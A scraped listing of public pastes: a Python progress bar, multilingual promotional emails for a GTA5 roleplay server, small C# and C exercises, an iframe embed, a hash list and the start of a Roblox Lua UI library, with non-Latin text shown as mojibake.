        
}

"
Agvxpuyu,Luna-2,Zulfiqor,GetText,Friday 21st of June 2024 12:00:23 PM CDT,"#luna2
9b33c5785b863db5a1f348e2f4da22c9609d5c5539cf3718572e9b6789433c74
db12f217483a89d72d332f8eb7cb28a3418eb9ff5e512fb99c5f134c7a58ba17
fc2f037ff0ef5ad2d4be6470e2b3cba4b9494fa9edb44ae127b03f2356ff3ba6"
Z6xaaeny,loading_bar,Python253,Python,Friday 21st of June 2024 11:58:24 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: loading_bar.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    - This script displays a loading progress bar in the terminal.
    - The progress bar shows the progress of an iterable task with a colored visual representation.
    - The `colorama` module is used to display the bar in green while keeping the percentage data in the default terminal color.

Requirements:
    - Python 3.x
    - The Following Modules:
        - sys
        - time
        - random
        - colorama
 
Functions:
    - colored_progress_bar(iterable, prefix='', size=42):
        Displays a colored progress bar for an iterable.
 
Usage:
    - Ensure Python 3.x is installed.
    - Install required modules using pip (if not already installed):
      
      EXAMPLE:
          pip install colorama

    - Run the script:
      
      EXAMPLE:
          python loading_bar.py

Additional Notes:
    - The script includes a short delay before exiting to ensure the completion message is visible.
    - The progress bar simulates varying speeds for each step in the progress.
""""""

import sys
import time
import random
from colorama import init, Fore

# Initialize colorama to handle colored text in the terminal
init(autoreset=True)

def colored_progress_bar(iterable, prefix='', size=42):
    """"""
    Displays a colored progress bar for an iterable.

    Args:
        iterable (iterable): An iterable object to iterate over.
        prefix (str): Prefix text for the progress bar.
        size (int): Size of the progress bar (number of characters).
    """"""
    count = len(iterable)  # Total number of items in the iterable
    
    for i, item in enumerate(iterable):
        progress = i + 1  # Current progress count
        percent = progress / count * 100  # Current progress in percentage
        bar_fill = int(size * progress / count)  # Number of filled blocks in the bar
        
        # Construct the progress bar string
        bar = f""{prefix}[{Fore.GREEN}{'‚ñà' * bar_fill}{Fore.RESET}{' ' * (size - bar_fill)}]""
        percentage_data = f""{progress}/{count} ({percent:.2f}%)""  # Progress data string
        indent = ""\t\t""  # Two tabs for indentation
        
        # Print the progress bar with progress data
        print(f""{bar} {indent}{percentage_data}"", end='\r', flush=True)
        
        # Simulate varying speeds for each step in the progress
        time.sleep(random.uniform(0.02, 0.1))

    print()  # Move to a new line after completion to clean up the final progress bar

if __name__ == '__main__':
    # Run the progress bar for a range of 79 iterations
    colored_progress_bar(range(79), prefix='Loading:', size=42)
    
    # Print completion message after the progress bar finishes
    print(""\nAll processes completed!\n\n\t Exiting Program...   GoodBye!"", flush=True)
    
    # Short delay before exiting to ensure the message is read
    time.sleep(1)
    
    # Exit the program with status code 0 indicating successful execution
    sys.exit(0)
"
NQeUjsGR,M√™me Slim Capella ne le savait pas !,Shpindlier,HTML,Friday 21st of June 2024 11:45:36 AM CDT,"<!DOCTYPE html>
<html>
	<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8"">
	</head>
	<body>
		<div style=""background-color: #000;"">
			<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
				<tbody>
					<tr>
						<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCnpNVC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
					</tr>
					<tr>
						<td>
							<p style=""color: #fff; font-family: 'Arial'; font-size: 44px; letter-spacing: 0.01em; line-height: 40px; text-decoration: none; width: 500px; padding: 0px 0px 0px 34px;""><strong>M√™me Slim Capella ne le savait pas !</strong></p>
						</td>
					</tr>
				</tbody>
				<tbody>
					<tr>
						<td align=""center""><img src=""https://gen.sendtric.com/countdown/x4217yo5lk"" style=""display: block; max-width: 100%;""></td>
					</tr>
				</tbody>
				<tbody>
					<tr>
						<td align=""center"" style=""padding-top: 10px;"">
							<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Le 24 juin, un √©v√©nement estival important aura lieu sur Grand RP ! Nous vous annon√ßons un nouveau BattlePass d'√©t√© ! Il est temps de collecter les r√©compenses restantes et de se pr√©parer √† en recevoir de nouvelles !</p>
						</td>
					</tr>
					<tr>
						<td align=""center"" class=""m_392802941358454063b m_392802941358454063n m_392802941358454063e m_392802941358454063g m_392802941358454063mga m_392802941358454063au m_392802941358454063vp m_392802941358454063xb m_392802941358454063qu m_392802941358454063a8"" style=""border-collapse: collapse; font-size: 0; padding: 0; word-break: break-word;"">
							<table border=""0"" cellpadding=""0"" cellspacing=""0"" role=""presentation"" style=""border-collapse: separate; width: 309px; line-height: 100%;"" width=""309"">
								<tbody>
									<tr>
										<td align=""center"" bgcolor=""#fffffe"" role=""presentation"" style=""border-collapse: collapse; background: #fffffe; border: none; border-radius: 15px 15px 15px 15px;"" valign=""middle""><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" style=""display: inline-block; width: 309px; background-color: #fffffe; color: #ffffff; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-size: 13px; font-weight: normal; line-height: 100%; margin: 0; text-decoration: none; text-transform: none; padding: 16px 0px 16px 0px; border-radius: 36px 36px 36px 36px;"" target=""_blank"" data-saferedirecturl=""https://gta5grand.com/?ref=2""><span style=""font-size: 20px; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-weight: bold; color: #0a0d15; line-height: 100%;"">Je serai bient√¥t l√† !</span></a></td>
									</tr>
								</tbody>
							</table>
						</td>
					</tr>
					<tr>
						<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
					</tr>
					<tr>
						<td align=""center"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</td>
					</tr>
				</tbody>
			</table>
		</div>
	</body>
</html>"
6vkEgeXp,„Åì„ÅÆ„Åì„Å®„Çí„Çπ„É™„É†„Éª„Ç´„Éö„É©„Åô„Çâ‰∫àÊÉ≥„Åó„Å™„Åã„Å£„Åü!,Shpindlier,HTML,Friday 21st of June 2024 11:43:33 AM CDT,"<!DOCTYPE html>
<html>
	<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8"">
	</head>
	<body>
		<div style=""background-color: #000;"">
			<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
				<tbody>
					<tr>
						<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCnpNVC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
					</tr>
					<tr>
						<td>
							<p style=""color: #fff; font-family: 'Arial'; font-size: 44px; letter-spacing: 0.01em; line-height: 40px; text-decoration: none; width: 500px; padding: 0px 0px 0px 34px;""><strong>„Åì„ÅÆ„Åì„Å®„Çí„Çπ„É™„É†„Éª„Ç´„Éö„É©„Åô„Çâ‰∫àÊÉ≥„Åó„Å™„Åã„Å£„Åü!</strong></p>
						</td>
					</tr>
				</tbody>
				<tbody>
					<tr>
						<td align=""center""><img src=""https://gen.sendtric.com/countdown/x4217yo5lk"" style=""display: block; max-width: 100%;""></td>
					</tr>
				</tbody>
				<tbody>
					<tr>
						<td align=""center"" style=""padding-top: 10px;"">
							<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">6Êúà24Êó•„Å´„ÅØ„Ç∞„É©„É≥„ÉâRP„ÅßÈáçË¶Å„Å™Â§è„ÅÆ„Ç§„Éô„É≥„Éà„ÅåÈñãÂÇ¨„Åï„Çå„Åæ„ÅôÔºÅÊñ∞„Åó„ÅÑÂ§è„ÅÆ„Éê„Éà„É´„Éë„Çπ„ÇíÁô∫Ë°®„Åó„Åæ„ÅôÔºÅÊÆã„Çä„ÅÆË≥ûÂìÅ„ÇíÈõÜ„ÇÅ„Å¶„ÄÅÊñ∞„Åó„ÅÑË≥ûÂìÅ„Å´ÂÇô„Åà„Åæ„Åó„Çá„ÅÜÔºÅ</p>
						</td>
					</tr>
					<tr>
						<td align=""center"" class=""m_392802941358454063b m_392802941358454063n m_392802941358454063e m_392802941358454063g m_392802941358454063mga m_392802941358454063au m_392802941358454063vp m_392802941358454063xb m_392802941358454063qu m_392802941358454063a8"" style=""border-collapse: collapse; font-size: 0; padding: 0; word-break: break-word;"">
							<table border=""0"" cellpadding=""0"" cellspacing=""0"" role=""presentation"" style=""border-collapse: separate; width: 309px; line-height: 100%;"" width=""309"">
								<tbody>
									<tr>
										<td align=""center"" bgcolor=""#fffffe"" role=""presentation"" style=""border-collapse: collapse; background: #fffffe; border: none; border-radius: 15px 15px 15px 15px;"" valign=""middle""><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" style=""display: inline-block; width: 309px; background-color: #fffffe; color: #ffffff; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-size: 13px; font-weight: normal; line-height: 100%; margin: 0; text-decoration: none; text-transform: none; padding: 16px 0px 16px 0px; border-radius: 36px 36px 36px 36px;"" target=""_blank"" data-saferedirecturl=""https://gta5grand.com/?ref=2""><span style=""font-size: 20px; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-weight: bold; color: #0a0d15; line-height: 100%;"">„Åô„Åê„Å´Ë°å„Åç„Åæ„ÅôÔºÅ</span></a></td>
									</tr>
								</tbody>
							</table>
						</td>
					</tr>
					<tr>
						<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
					</tr>
					<tr>
						<td align=""center"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</td>
					</tr>
				</tbody>
			</table>
		</div>
	</body>
</html>"
s9mW1AZ8,Dynamic Massive,SaNik74,C#,Friday 21st of June 2024 11:41:44 AM CDT,"namespace ListDynamicMassive
{
    internal class Program
    {
        static void Main(string[] args)
        {
            List<double> numbers = new List<double>();
            bool isWorking = true;
            string sumNumbersCommand = ""sum"";
            string exitCommand = ""exit"";
            string errorMessage = $""–í–≤–æ–¥ –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –∫–æ–º–∞–Ω–¥—ã —Å–ª–æ–∂–µ–Ω–∏—è –≤—Å–µ—Ö —á–∏—Å–µ–ª - {sumNumbersCommand},"" +
                $"" –≤—ã—Ö–æ–¥ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã - {exitCommand} –∏–ª–∏ —á–∏—Å–ª–æ."";

            while (isWorking)
            {
                double number;
                bool isNumber;

                Console.Write($""–°–ª–æ–∂–∏—Ç—å –≤—Å–µ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ —á–∏—Å–ª–∞ - {sumNumbersCommand}\n"" +
                $""–í—ã–π—Ç–∏ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã - {exitCommand}\n"" +
                $""–í–≤–æ–¥: "");

                string userInput = Console.ReadLine();

                isNumber = double.TryParse(userInput, out number);

                if (isNumber)
                {
                    AddNumber(numbers, number);
                }
                else if (userInput == sumNumbersCommand)
                {
                    double sumOfNumbers = CalculateSum(numbers);
                    Console.WriteLine($""–°—É–º–º–∞ –≤—Å–µ—Ö –≤–≤–µ–¥–µ–Ω–Ω—ã—Ö —á–∏—Å–µ–ª: {sumOfNumbers}"");
                }
                else if (userInput == exitCommand)
                {
                    Console.WriteLine(""–í—ã—Ö–æ–¥ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã.\n–ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É..."");
                    isWorking = false;
                }
                else
                {
                    Console.WriteLine(errorMessage);
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        static void AddNumber(List<double> numbers, double number)
        {
            numbers.Add(number);
        }

        static double CalculateSum(List<double> numbers)
        {
            double sumAllNumbers = 0;

            foreach (double value in numbers)
            {
                sumAllNumbers += value;
            }

            return sumAllNumbers;
        }
    }
}"
Bnc0Y1jC,ƒåak ni Slim Capella to nije znao!,Shpindlier,HTML,Friday 21st of June 2024 11:41:16 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/6HQqeY4.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td>
						<p style=""color: #fff; font-family: 'Arial'; font-size: 44px; letter-spacing: 0.01em; line-height: 40px; text-decoration: none; width: 500px; padding: 0px 0px 0px 34px;""><strong>ƒåak ni Slim Capella to nije znao!</strong></p>
					</td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center""><img src=""https://gen.sendtric.com/countdown/x4217yo5lk"" style=""display: block; max-width: 100%;""></td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Juna 24, na Grand RP odr≈æacÃÅe se va≈æan letnji dogaƒëaj! Najavljujemo novi letnji BattlePass! Vreme je da prikupite preostale nagrade i da se spremite za nove nagrade!</p>
					</td>
				</tr>
				<tr>
					<td align=""center"" class=""m_392802941358454063b m_392802941358454063n m_392802941358454063e m_392802941358454063g m_392802941358454063mga m_392802941358454063au m_392802941358454063vp m_392802941358454063xb m_392802941358454063qu m_392802941358454063a8"" style=""border-collapse: collapse; font-size: 0; padding: 0; word-break: break-word;"">
						<table border=""0"" cellpadding=""0"" cellspacing=""0"" role=""presentation"" style=""border-collapse: separate; width: 309px; line-height: 100%;"" width=""309"">
							<tbody>
								<tr>
									<td align=""center"" bgcolor=""#fffffe"" role=""presentation"" style=""border-collapse: collapse; background: #fffffe; border: none; border-radius: 15px 15px 15px 15px;"" valign=""middle""><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" style=""display: inline-block; width: 309px; background-color: #fffffe; color: #ffffff; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-size: 13px; font-weight: normal; line-height: 100%; margin: 0; text-decoration: none; text-transform: none; padding: 16px 0px 16px 0px; border-radius: 36px 36px 36px 36px;"" target=""_blank"" data-saferedirecturl=""https://gta5grand.com/?ref=2""><span style=""font-size: 20px; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-weight: bold; color: #0a0d15; line-height: 100%;"">Ja cÃÅu uƒçestvovati</span></a></td>
								</tr>
							</tbody>
						</table>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td align=""center"">
						<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
UgRJFv34,Das wusste nicht einmal Slim Capella!,Shpindlier,HTML,Friday 21st of June 2024 11:38:30 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/6HQqeY4.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td>
						<p style=""color: #fff; font-family: 'Arial'; font-size: 44px; letter-spacing: 0.01em; line-height: 40px; text-decoration: none; width: 500px; padding: 0px 0px 0px 34px;""><strong>Das wusste nicht einmal Slim Capella!</strong></p>
					</td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center""><img src=""https://gen.sendtric.com/countdown/x4217yo5lk"" style=""display: block; max-width: 100%;""></td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Am 24.Juni findet auf Grand RP ein spannendes Sommerevent statt! Wir k√ºndigen einen neuen Sommer-BattlePass an! Es ist Zeit, die restlichen Preise einzusammeln und sich auf einen Neuen vorzubereiten!</p>
					</td>
				</tr>
				<tr>
					<td align=""center"" class=""m_392802941358454063b m_392802941358454063n m_392802941358454063e m_392802941358454063g m_392802941358454063mga m_392802941358454063au m_392802941358454063vp m_392802941358454063xb m_392802941358454063qu m_392802941358454063a8"" style=""border-collapse: collapse; font-size: 0; padding: 0; word-break: break-word;"">
						<table border=""0"" cellpadding=""0"" cellspacing=""0"" role=""presentation"" style=""border-collapse: separate; width: 309px; line-height: 100%;"" width=""309"">
							<tbody>
								<tr>
									<td align=""center"" bgcolor=""#fffffe"" role=""presentation"" style=""border-collapse: collapse; background: #fffffe; border: none; border-radius: 15px 15px 15px 15px;"" valign=""middle""><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" style=""display: inline-block; width: 309px; background-color: #fffffe; color: #ffffff; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-size: 13px; font-weight: normal; line-height: 100%; margin: 0; text-decoration: none; text-transform: none; padding: 16px 0px 16px 0px; border-radius: 36px 36px 36px 36px;"" target=""_blank"" data-saferedirecturl=""https://gta5grand.com/?ref=2""><span style=""font-size: 20px; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-weight: bold; color: #0a0d15; line-height: 100%;"">Ich will teilnehmen!</span></a></td>
								</tr>
							</tbody>
						</table>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td align=""center"">
						<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
za7vZPuh,Even Slim Capella didn't know that!,Shpindlier,HTML,Friday 21st of June 2024 11:20:25 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/6HQqeY4.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td>
						<p style=""color: #fff; font-family: 'Arial'; font-size: 44px; letter-spacing: 0.01em; line-height: 40px; text-decoration: none; width: 500px; padding: 0px 0px 0px 34px;""><strong>Even Slim Capella didn't know that!</strong></p>
					</td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center""><img src=""https://gen.sendtric.com/countdown/x4217yo5lk"" style=""display: block; max-width: 100%;""></td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">On June 24, an important summer event will take place at the Grand RP! We are announcing a new summer BattlePass! It's time to collect the remaining prizes and get ready for a new one!</p>
					</td>
				</tr>
				<tr>
					<td align=""center"" class=""m_392802941358454063b m_392802941358454063n m_392802941358454063e m_392802941358454063g m_392802941358454063mga m_392802941358454063au m_392802941358454063vp m_392802941358454063xb m_392802941358454063qu m_392802941358454063a8"" style=""border-collapse: collapse; font-size: 0; padding: 0; word-break: break-word;"">
						<table border=""0"" cellpadding=""0"" cellspacing=""0"" role=""presentation"" style=""border-collapse: separate; width: 309px; line-height: 100%;"" width=""309"">
							<tbody>
								<tr>
									<td align=""center"" bgcolor=""#fffffe"" role=""presentation"" style=""border-collapse: collapse; background: #fffffe; border: none; border-radius: 15px 15px 15px 15px;"" valign=""middle""><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" style=""display: inline-block; width: 309px; background-color: #fffffe; color: #ffffff; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-size: 13px; font-weight: normal; line-height: 100%; margin: 0; text-decoration: none; text-transform: none; padding: 16px 0px 16px 0px; border-radius: 36px 36px 36px 36px;"" target=""_blank"" data-saferedirecturl=""https://gta5grand.com/?ref=2""><span style=""font-size: 20px; font-family: 'Helvetica Neue','Helvetica',sans-serif; font-weight: bold; color: #0a0d15; line-height: 100%;"">I‚Äôll be there soon!</span></a></td>
								</tr>
							</tbody>
						</table>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td align=""center"">
						<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
czusiXSD,Untitled,dllbridge,C,Friday 21st of June 2024 11:08:14 AM CDT,"#include <stdio.h>
 
 
 
int     nx,
        ng,                              //       –í—Å–µ–≥–æ –≥—Ä—É–ø–ø –ø–æ 7 –∫–Ω–∏–≥ 
        no;                              //  –æ—Å—Ç–∞—Ç–æ–∫ –æ—Ç –≥—Ä—É–ø–ø –∏–∑ 7 –∫–Ω–∏–≥     
 
 
 
///////////////////////////////////////////
int main()                               //  
{
    
    
    
    printf(""Enter count of books: "");  scanf(""%d"", &nx);
    
    printf(""nx = %d\n"", nx);
    
    ng = nx / 7;    
    no = nx % 7;
 
    printf(""ng = %d\n"", ng);
    printf(""no = %d\n"", no);            
}
 




"
Ugxd4DHu,test,Agen868,HTML,Friday 21st of June 2024 10:35:20 AM CDT,"<iframe width=""640"" height=""360"" src=""https://short.ink/xqfI8JwRa"" frameborder=""0"" scrolling=""0"" allowfullscreen></iframe>"
TRM9aNX1,ÈÇÄÊÇ®‰∏ÄËµ∑ÁúãÔºöÁõ¥Êí≠ÁõíÂ≠ê,xiaomianao666,JavaScript,Friday 21st of June 2024 10:15:25 AM CDT,Êµ∑ÈòîËßÜÁïåËßÑÂàôÂàÜ‰∫´ÔºåÂΩìÂâçÂàÜ‰∫´ÁöÑÊòØÔºö‰∫åÁ∫ßÈ°µÈù¢ËØ¶ÊÉÖÔø•page_detailÔø•Áõ¥Êí≠ÁõíÂ≠ê@@
fc9fLKSp,Etronix-Library,besteryoutube,Lua,Friday 21st of June 2024 10:04:27 AM CDT,"local Library = {}

-- DEFINING GLOBALS --
if not _G.Settings then
	_G.Settings = {
		['Name'] = 'Shadow Lib v2',
		['Intro'] = false,
		['Keybind'] = 'G'
	}
end


-- Constants --
local PLAYERSERVICE = game:GetService('Players')
local TWEENSERVICE = game:GetService('TweenService')
local CONTEXTACTIONSERVICE = game:GetService('ContextActionService')
local USERINPUTSERVICE = game:GetService('UserInputService')

local LOCALPLAYER = PLAYERSERVICE.LocalPlayer

-- Variables --
local CurrentTab = nil


-- Functions --
local function MakeTween(Item, Info, Goal)
	return TWEENSERVICE:Create(Item, Info, Goal)
end

local function Ripple(Button, x, y)
	local Ripple = Instance.new(""ImageLabel"")
	Ripple.Name = ""Circle""
	Ripple.Parent = Button
	Ripple.BackgroundTransparency = 1
	Ripple.AnchorPoint = Vector2.new(0.5, 0.5)
	Ripple.Position = UDim2.new(0,x - Button.AbsolutePosition.X, 0, y - Button.AbsolutePosition.Y - 36)
	Ripple.Image = ""rbxassetid://3570695787""
	Ripple.ScaleType = Enum.ScaleType.Slice
	Ripple.SliceCenter = Rect.new(100, 100, 100, 100)
	local RippleFx = MakeTween(Ripple, TweenInfo.new(0.5), {Size = UDim2.new(0, 300, 0, 300), ImageTransparency = 0.95})
	RippleFx:Play()
	RippleFx.Completed:Wait()
	Ripple:Destroy()
end

-- SCREEN GUI --
local ShadowLib = Instance.new(""ScreenGui"")
ShadowLib.Name = ""ShadowLib""
if game:GetService(""RunService""):IsStudio() then
	ShadowLib.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
else
	ShadowLib.Parent = game:GetService('CoreGui')
end

-- INTRO --
if _G.Settings['Intro'] == true then
	local IntroFrame = Instance.new(""Frame"")
	local Background = Instance.new(""Frame"")
	local Pieces = Instance.new(""Frame"")
	local TitleFrame = Instance.new(""ImageButton"")
	local IntroText = Instance.new(""TextLabel"")
	
	IntroFrame.Name = ""IntroFrame""
	IntroFrame.Parent = ShadowLib
	IntroFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	IntroFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	IntroFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	IntroFrame.Size = UDim2.new(0.00999999978, 0, 0.00999999978, 0)
	
	Background.Name = ""Background""
	Background.Parent = IntroFrame
	Background.AnchorPoint = Vector2.new(0.5, 0.5)
	Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Background.Position = UDim2.new(0.5, 0, 0.5, 0)
	Background.Size = UDim2.new(1, 0, 1, 0)
	
	Pieces.Name = ""Pieces""
	Pieces.Parent = Background
	Pieces.AnchorPoint = Vector2.new(0.5, 0.5)
	Pieces.BackgroundColor3 = Color3.fromRGB(75, 0, 125)
	Pieces.Position = UDim2.new(0.5, 0, 0.5, 0)
	Pieces.Rotation = 45
	Pieces.Size = UDim2.new(8.1, 0, 32.25, 0)
	Pieces.ZIndex = 2
	
	Pieces_2 = Pieces:Clone()
	Pieces_2.Parent = Background
	Pieces_2.BackgroundColor3 = Color3.fromRGB(50, 0, 100)
	Pieces_2.Rotation = 0
	
	Pieces_3 = Pieces:Clone()
	Pieces_3.Parent = Background
	Pieces_3.BackgroundColor3 = Color3.fromRGB(0, 0, 100)
	Pieces_3.Rotation = 135
	
	TitleFrame.Name = ""TitleFrame""
	TitleFrame.Parent = IntroFrame
	TitleFrame.Active = false
	TitleFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	TitleFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TitleFrame.BackgroundTransparency = 1.000
	TitleFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	TitleFrame.Rotation = 90
	TitleFrame.Selectable = false
	TitleFrame.Size = UDim2.new(8.1, 0, 35, 0)
	TitleFrame.ZIndex = 4
	TitleFrame.Image = ""rbxassetid://3570695787""
	TitleFrame.ImageColor3 = Color3.fromRGB(0, 0, 25)
	TitleFrame.ScaleType = Enum.ScaleType.Slice
	TitleFrame.SliceCenter = Rect.new(100, 100, 100, 100)
	TitleFrame.SliceScale = 0.100
	
	IntroText.Parent = TitleFrame
	IntroText.AnchorPoint = Vector2.new(0.5, 0.5)
	IntroText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	IntroText.BackgroundTransparency = 1.000
	IntroText.Position = UDim2.new(0.5, 0, 0.5, 0)
	IntroText.Rotation = -90.000
	IntroText.Size = UDim2.new(2.5, 0, 0.25, 0)
	IntroText.ZIndex = 5
	IntroText.Font = Enum.Font.GothamBlack
	IntroText.Text = _G.Settings['Name']
	IntroText.TextColor3 = Color3.fromRGB(255, 255, 255)
	IntroText.TextScaled = true
	IntroText.TextSize = 14
	IntroText.TextWrapped = true
	
	local Tween = MakeTween(IntroFrame, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 0.5, 0)})
	Tween:Play()
	Tween.Completed:Wait()
	
	local Tween = MakeTween(IntroFrame, TweenInfo.new(2, Enum.EasingStyle.Sine), {Rotation = 720})
	Tween:Play()
	Tween.Completed:Wait()
	
	IntroFrame.Rotation = 0
	
	local Tween = MakeTween(IntroFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(0.0125, 0, 0.0125, 0)})
	Tween:Play()
	Tween.Completed:Wait()
	
